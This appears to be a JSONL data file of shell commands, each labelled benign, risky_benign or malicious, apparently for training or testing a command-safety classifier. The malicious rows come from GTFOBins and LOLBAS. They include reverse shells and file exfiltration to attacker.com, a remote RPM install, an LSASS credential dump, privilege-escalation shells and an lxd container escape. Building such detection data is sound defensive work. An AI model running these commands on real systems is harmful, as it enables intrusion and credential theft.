+{"command": "mawk '//' /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "awk", "id": 1099}
+{"command": "ruby -e 'Process::Sys.setuid(0); exec \"/bin/sh\"'", "label": "malicious", "source": "gtfobins", "detail": "ruby", "id": 1100}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "go", "id": 1101}
+{"command": "read -p \"`echo -e 'Please Enter a Message: \\n\\b'`\" message", "label": "benign", "source": "nl2bash", "detail": null, "id": 1102}
+{"command": "finger -l | grep \"Name:\" | tr -s ' ' | cut -d \" \" -f 2,4- | sort | uniq", "label": "benign", "source": "nl2bash", "detail": null, "id": 1103}
+{"command": "echo `whoami`", "label": "benign", "source": "nl2bash", "detail": null, "id": 1104}
+{"command": "xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}", "label": "malicious", "source": "lolbas", "detail": "Xwizard.exe", "id": 1105}
+{"command": "find . -regextype sed -regex \".*/[a-f0-9\\-]\\{36\\}\\.jpg\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1106}
+{"command": "lua -e 'os.execute(\"/bin/sh\")'", "label": "malicious", "source": "gtfobins", "detail": "lua", "id": 1107}
+{"command": "rundll32.exe url.dll,FileProtocolHandler {PATH_ABSOLUTE:.exe}", "label": "malicious", "source": "lolbas", "detail": "Url.dll", "id": 1108}
+{"command": "`sudo chown -R mongodb:mongodb /data/*`", "label": "benign", "source": "nl2bash", "detail": null, "id": 1109}
+{"command": "rename 's/^123_//' *.txt", "label": "benign", "source": "nl2bash", "detail": null, "id": 1110}
+{"command": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe", "label": "malicious", "source": "lolbas", "detail": "Extrac32.exe", "id": 1111}
+{"command": "nc -l -p 12345", "label": "malicious", "source": "gtfobins", "detail": "julia", "id": 1112}
+{"command": "csvtool call '/bin/sh;false' /etc/hosts", "label": "malicious", "source": "gtfobins", "detail": "csvtool", "id": 1113}
+{"command": "openvpn --dev null --script-security 2 --up '/bin/sh -s'", "label": "malicious", "source": "gtfobins", "detail": "openvpn", "id": 1114}
+{"command": "find / -fstype ext3 -name zsh -ls 2> /dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 1115}
+{"command": "WorkFolders", "label": "malicious", "source": "lolbas", "detail": "WorkFolders.exe", "id": 1116}
+{"command": "rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump {LSASS_PID} dump.bin full", "label": "malicious", "source": "lolbas", "detail": "Comsvcs.dll", "id": 1117}
+{"command": "od -An -N2 -i /dev/random", "label": "benign", "source": "nl2bash", "detail": null, "id": 1118}
+{"command": "git clean -fdx", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1119}
+{"command": "find -perm 664", "label": "benign", "source": "nl2bash", "detail": null, "id": 1120}
+{"command": "sed -i 's/DEBUG=false/DEBUG=true/' .env", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1121}
+{"command": "logger.exe RUNW \"{CMD}\"", "label": "malicious", "source": "lolbas", "detail": "Logger.exe", "id": 1122}
+{"command": "cd /tmp", "label": "benign", "source": "nl2bash", "detail": null, "id": 1123}
+{"command": "nano -s '/bin/sh -p'\n/bin/sh -p\n^T^T", "label": "malicious", "source": "gtfobins", "detail": "nano", "id": 1124}
+{"command": "shred -u $FILE", "label": "benign", "source": "nl2bash", "detail": null, "id": 1125}
+{"command": "history", "label": "benign", "source": "nl2bash", "detail": null, "id": 1126}
+{"command": "ifconfig | grep -E \"([0-9]{1,3}\\.){3}[0-9]{1,3}\" | grep -v 127.0.0.1 | awk '{ print $2 }' | cut -f2 -d:", "label": "benign", "source": "nl2bash", "detail": null, "id": 1127}
+{"command": "bash -p -c 'echo -e \"POST / HTTP/0.9\\n\\n$(</path/to/input-file)\" >/dev/tcp/attacker.com/12345'", "label": "malicious", "source": "gtfobins", "detail": "ksh", "id": 1128}
+{"command": "find . -regex '.*myfile[0-9][0-9]?'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1129}
+{"command": "makecab {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:autoruns.cab", "label": "malicious", "source": "lolbas", "detail": "Makecab.exe", "id": 1130}
+{"command": "ps -p $$ | tail -1 | awk '{print $NF}'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1131}
+{"command": "find . -name '*js' -exec grep -n 'some string' {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1132}
+{"command": "find $INPUT_LOCATION -name '*.pdf.marker' | xargs -i bash -c 'mv ${0%.marker} $0 $1' {} $OUTPUT_LOCATION", "label": "benign", "source": "nl2bash", "detail": null, "id": 1133}
+{"command": "emacs -Q -nw --eval '(term \"/bin/sh\")'", "label": "malicious", "source": "gtfobins", "detail": "emacs", "id": 1134}
+{"command": "nm /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nm", "id": 1135}
+{"command": "pandoc -t plain /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "pandoc", "id": 1136}
+{"command": "gcore $PID", "label": "malicious", "source": "gtfobins", "detail": "gcore", "id": 1137}
+{"command": "nasm -@ /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nasm", "id": 1138}
+{"command": "b=`echo \"$a\" | awk '{ print toupper($1) }'`", "label": "benign", "source": "nl2bash", "detail": null, "id": 1139}
+{"command": "find /home -mtime -7", "label": "benign", "source": "nl2bash", "detail": null, "id": 1140}
+{"command": "certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'", "label": "malicious", "source": "gtfobins", "detail": "certbot", "id": 1141}
+{"command": "echo \"$f\" | grep -Eo '[0-9]+[.]+[0-9]+[.]?[0-9]?' | cut -d. -f2", "label": "benign", "source": "nl2bash", "detail": null, "id": 1142}
+{"command": "pkg install -y --no-repo-update ./x-1.0.txz", "label": "malicious", "source": "gtfobins", "detail": "pkg", "id": 1143}
+{"command": "chown $(id -un):$(id -gn) /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "chown", "id": 1144}
+{"command": "cargo help doc", "label": "malicious", "source": "gtfobins", "detail": "cargo", "id": 1145}
+{"command": "while read line ; do cp \"$line\" ~/bar ; done < <(find . | grep foo)", "label": "benign", "source": "nl2bash", "detail": null, "id": 1146}
+{"command": "echo x | msgfilter -P /bin/sh -p -c '/bin/sh -p 0<&2 1>&2; kill $PPID'", "label": "malicious", "source": "gtfobins", "detail": "msgfilter", "id": 1147}
+{"command": "vim -c ':py ...'", "label": "malicious", "source": "gtfobins", "detail": "view", "id": 1148}
+{"command": "gem open debug", "label": "malicious", "source": "gtfobins", "detail": "gem", "id": 1149}
+{"command": "rsync -auve \"ssh -p 2222\" . me@localhost:/some/path", "label": "benign", "source": "nl2bash", "detail": null, "id": 1150}
+{"command": "env | grep '^\\(GO\\|HOME=\\|PATH=\\)'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1151}
+{"command": "dxcap.exe -usage", "label": "malicious", "source": "lolbas", "detail": "Dxcap.exe", "id": 1152}
+{"command": "echo /path/to/temp-dir/ >/path/to/temp-file\nldconfig -f /path/to/temp-file\nping", "label": "malicious", "source": "gtfobins", "detail": "ldconfig", "id": 1153}
+{"command": "seq $(tail -1 file)|diff - file|grep -Po '.*(?=d)'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1154}
+{"command": "yum install http://attacker.com/path/to/input-file.rpm", "label": "malicious", "source": "gtfobins", "detail": "yum", "id": 1155}
+{"command": "tree -a .", "label": "benign", "source": "nl2bash", "detail": null, "id": 1156}
+{"command": "find . -name \"foo.*\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1157}
+{"command": "gem build /path/to/script.rb", "label": "malicious", "source": "gtfobins", "detail": "gem", "id": 1158}
+{"command": "grep -w -v -f blacklist file", "label": "benign", "source": "nl2bash", "detail": null, "id": 1159}
+{"command": "pip install -r requirements.txt --upgrade", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1160}
+{"command": "find /dir/to/search/ -type d -iname \".*\" -ls", "label": "benign", "source": "nl2bash", "detail": null, "id": 1161}
+{"command": "procdump.exe -md {PATH:.dll} explorer.exe", "label": "malicious", "source": "lolbas", "detail": "Procdump.exe", "id": 1162}
+{"command": "ls /homes/ndeklein/mzml/*.gz | xargs -I {} gunzip {}", "label": "benign", "source": "nl2bash", "detail": null, "id": 1163}
+{"command": "kill $(lsof -t -i:8080)", "label": "benign", "source": "nl2bash", "detail": null, "id": 1164}
+{"command": "cargo build --release", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1165}
+{"command": "extrac32 {PATH_ABSOLUTE:.cab} {PATH_ABSOLUTE}:file.exe", "label": "malicious", "source": "lolbas", "detail": "Extrac32.exe", "id": 1166}
+{"command": "read -rsp $'Press enter to continue...\\n'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1167}
+{"command": "mv tobecopied/tobeexcluded .", "label": "benign", "source": "nl2bash", "detail": null, "id": 1168}
+{"command": "find  /path/to/directory/* -maxdepth 0 -type d -exec basename {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1169}
+{"command": "find -type f -perm /110", "label": "benign", "source": "nl2bash", "detail": null, "id": 1170}
+{"command": "php -r '$r=array(); exec(\"/path/to/command\", $r); print(join(\"\\n\",$r));'", "label": "malicious", "source": "gtfobins", "detail": "php", "id": 1171}
+{"command": "cat ~/.ssh/config", "label": "benign", "source": "nl2bash", "detail": null, "id": 1172}
+{"command": "rsync -rvz -e 'ssh -p 2222' --progress --remove-sent-files ./dir user@host:/path", "label": "benign", "source": "nl2bash", "detail": null, "id": 1173}
+{"command": "make K_VERSION=`uname -r`", "label": "benign", "source": "nl2bash", "detail": null, "id": 1174}
+{"command": "terraform apply -auto-approve", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1175}
+{"command": "mawk 'BEGIN { print \"DATA\" > \"/path/to/output-file\" }'", "label": "malicious", "source": "gtfobins", "detail": "awk", "id": 1176}
+{"command": "tac file | sed -e '/./,$!d' | tac | sed -e '/./,$!d'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1177}
+{"command": "Scriptrunner.exe -appvscript {PATH:.exe}", "label": "malicious", "source": "lolbas", "detail": "Scriptrunner.exe", "id": 1178}
+{"command": "find /home -name \"*.c\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1179}
+{"command": "find ../../$name-module -name 'Name*' -type f -exec bash -c 'mv \"$1\" \"${1/Name/$Name}\"' -- {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1180}
+{"command": "find . -maxdepth 2 -name '*.tex'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1181}
+{"command": "find -newer /etc/passwd", "label": "benign", "source": "nl2bash", "detail": null, "id": 1182}
+{"command": "find . -exec /bin/sh -p \\; -quit", "label": "malicious", "source": "gtfobins", "detail": "find", "id": 1183}
+{"command": "regsvr32 /s /n /u /i:{REMOTEURL:.sct} scrobj.dll", "label": "malicious", "source": "lolbas", "detail": "Regsvr32.exe", "id": 1184}
+{"command": "Microsoft.Workflow.Compiler.exe {PATH} {PATH:.log}", "label": "malicious", "source": "lolbas", "detail": "Microsoft.Workflow.Compiler.exe", "id": 1185}
+{"command": "ascii85 /path/to/input-file | ascii85 --decode", "label": "malicious", "source": "gtfobins", "detail": "ascii85", "id": 1186}
+{"command": "crontab -r", "label": "risky_benign", "source": "hand_curated", "detail": null, "id": 1187}
+{"command": "nft -f /path/to/input-file", "label": "malicious", "source": "gtfobins", "detail": "nft", "id": 1188}
+{"command": "diskshadow.exe /s {PATH:.txt}", "label": "malicious", "source": "lolbas", "detail": "Diskshadow.exe", "id": 1189}
+{"command": "ltrace -F /path/to/input-file /dev/null", "label": "malicious", "source": "gtfobins", "detail": "ltrace", "id": 1190}
+{"command": "node -e 'require(\"fs\").writeFileSync(\"/path/to/output-file\", \"DATA\")'", "label": "malicious", "source": "gtfobins", "detail": "node", "id": 1191}
+{"command": "logsave /dev/null /bin/sh -i", "label": "malicious", "source": "gtfobins", "detail": "logsave", "id": 1192}
+{"command": "find -name '*.undo' -exec wc -c {} + | tail -n 1", "label": "benign", "source": "nl2bash", "detail": null, "id": 1193}
+{"command": "shopt -u nullglob", "label": "benign", "source": "nl2bash", "detail": null, "id": 1194}
+{"command": "find ~/src -newer main.css", "label": "benign", "source": "nl2bash", "detail": null, "id": 1195}
+{"command": "echo `sed -e 's/$/\\ |\\ /g' file`", "label": "benign", "source": "nl2bash", "detail": null, "id": 1196}
+{"command": "rundll32.exe ieadvpack.dll,LaunchINFSection {PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,", "label": "malicious", "source": "lolbas", "detail": "Ieadvpack.dll", "id": 1197}
+{"command": "iscsicpl.exe", "label": "malicious", "source": "lolbas", "detail": "iscsicpl.exe", "id": 1198}
+{"command": "gawk 'BEGIN {\n    s = \"/inet/tcp/0/attacker.com/12345\";\n    while (1) {printf \"> \" |& s; if ((s |& getline c) <= 0) break;\n    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'", "label": "malicious", "source": "gtfobins", "detail": "nawk", "id": 1199}
+{"command": "python -c 'import sys\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(\"http://attacker.com\", open(\"/path/to/input-file\", \"rb\").read())'", "label": "malicious", "source": "gtfobins", "detail": "python", "id": 1200}
+{"command": "lxc image import ./alpine*.tar.gz --alias x\nlxc init x x -c security.privileged=true\nlxc config device add x x disk source=/ path=/mnt/ recursive=true\nlxc start x\nlxc exec x /bin/sh", "label": "malicious", "source": "gtfobins", "detail": "lxd", "id": 1201}
+{"command": "bcp \"SELECT payload_data FROM database.dbo.payloads WHERE id=1\" queryout \"C:\\Windows\\Temp\\payload.exe\" -S localhost -T -c", "label": "malicious", "source": "lolbas", "detail": "Bcp.exe", "id": 1202}
+{"command": "directories=$(diff -qr directory directory.original | cut -d' ' -f2 | xargs dirname | uniq)", "label": "benign", "source": "nl2bash", "detail": null, "id": 1203}
+{"command": "cat >/path/to/temp-file <<EOF\nload_module /path/to/lib.so;\nEOF\n\nnginx -t -c /path/to/temp-file", "label": "malicious", "source": "gtfobins", "detail": "nginx", "id": 1204}
+{"command": "find . -perm g=r -type f -exec ls -l {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1205}
+{"command": "mmc.exe -Embedding {PATH_ABSOLUTE:.msc}", "label": "malicious", "source": "lolbas", "detail": "Mmc.exe", "id": 1206}
+{"command": "Update.exe --processStart {PATH:.exe} --process-start-args \"{CMD:args}\"", "label": "malicious", "source": "lolbas", "detail": "Update.exe", "id": 1207}
+{"command": "python -m http.server 80", "label": "malicious", "source": "gtfobins", "detail": "ab", "id": 1208}
+{"command": "find . | grep 'some string' | grep js", "label": "benign", "source": "nl2bash", "detail": null, "id": 1209}
+{"command": "find  /   -print > masterfilelist.out", "label": "benign", "source": "nl2bash", "detail": null, "id": 1210}
+{"command": "Outlook.exe {REMOTEURL}", "label": "malicious", "source": "lolbas", "detail": "Outlook.exe", "id": 1211}
+{"command": "ls -1 | (for ((x=0;x<N;x++)) ; do read ; done ; head -n1)", "label": "benign", "source": "nl2bash", "detail": null, "id": 1212}
+{"command": "echo 127.0.0.1 ad.doubleclick.net | sudo tee -a /etc/hosts", "label": "benign", "source": "nl2bash", "detail": null, "id": 1213}
+{"command": "cmdstr=$(alias $aliascmd | cut -d\"'\" -f2 | xargs)", "label": "benign", "source": "nl2bash", "detail": null, "id": 1214}
+{"command": "ls -d */|sed 's|[/]||g'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1215}
+{"command": "curl victim.com -o /path/to/output-file", "label": "malicious", "source": "gtfobins", "detail": "busybox", "id": 1216}
+{"command": "find . -type d -path '*/\\.*' -prune -o -not -name '.*' -type f -name '*some text*' -print", "label": "benign", "source": "nl2bash", "detail": null, "id": 1217}
+{"command": "cscript //e:vbscript {PATH_ABSOLUTE}:script.vbs", "label": "malicious", "source": "lolbas", "detail": "Cscript.exe", "id": 1218}
+{"command": "ionice /bin/sh -p", "label": "malicious", "source": "gtfobins", "detail": "ionice", "id": 1219}
+{"command": "find . -perm -a+r -perm /a+w ! -perm /a+x", "label": "benign", "source": "nl2bash", "detail": null, "id": 1220}
+{"command": "ed\n!/bin/sh\nq", "label": "malicious", "source": "gtfobins", "detail": "ed", "id": 1221}
+{"command": "find -maxdepth 1 -type d", "label": "benign", "source": "nl2bash", "detail": null, "id": 1222}
+{"command": "rundll32.exe url.dll,OpenURL file://^C^:^/^W^i^n^d^o^w^s^/^s^y^s^t^e^m^3^2^/^c^a^l^c^.^e^x^e", "label": "malicious", "source": "lolbas", "detail": "Url.dll", "id": 1223}
+{"command": "read PASSWORD", "label": "benign", "source": "nl2bash", "detail": null, "id": 1224}
+{"command": "find /path/to/directory/folder{1..50} -name '*.txt'  2>/dev/null", "label": "benign", "source": "nl2bash", "detail": null, "id": 1225}
+{"command": "bash -p -c 'exec bash -p -i &>/dev/tcp/attacker.com/12345 <&1'", "label": "malicious", "source": "gtfobins", "detail": "bash", "id": 1226}
+{"command": "AgentExecutor.exe -powershell \"{PATH_ABSOLUTE:.ps1}\" \"{PATH_ABSOLUTE:.1.log}\" \"{PATH_ABSOLUTE:.2.log}\" \"{PATH_ABSOLUTE:.3.log}\" 60000 \"{PATH_ABSOLUTE:folder}\" 0 1", "label": "malicious", "source": "lolbas", "detail": "AgentExecutor.exe", "id": 1227}
+{"command": "echo \"`pwd -P`\"", "label": "benign", "source": "nl2bash", "detail": null, "id": 1228}
+{"command": "jshell\nRuntime.getRuntime().exec(\"/path/to/command\");", "label": "malicious", "source": "gtfobins", "detail": "jshell", "id": 1229}
+{"command": "find / -nouser | xargs -0 rm", "label": "benign", "source": "nl2bash", "detail": null, "id": 1230}
+{"command": "screen -x main -X title blah", "label": "benign", "source": "nl2bash", "detail": null, "id": 1231}
+{"command": "restic --password-command='/bin/sh -p -c \"/bin/sh -p 0<&2 1<&2\"' backup", "label": "malicious", "source": "gtfobins", "detail": "restic", "id": 1232}
+{"command": "wscript //e:vbscript {PATH}:script.vbs", "label": "malicious", "source": "lolbas", "detail": "Wscript.exe", "id": 1233}
+{"command": "find . -depth -name .svn -exec rm -fr {} \\;", "label": "benign", "source": "nl2bash", "detail": null, "id": 1234}
+{"command": "find . -lname '*sysdep.c'", "label": "benign", "source": "nl2bash", "detail": null, "id": 1235}
+{"command": "replace.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:folder} /A", "label": "malicious", "source": "lolbas", "detail": "Replace.exe", "id": 1236}
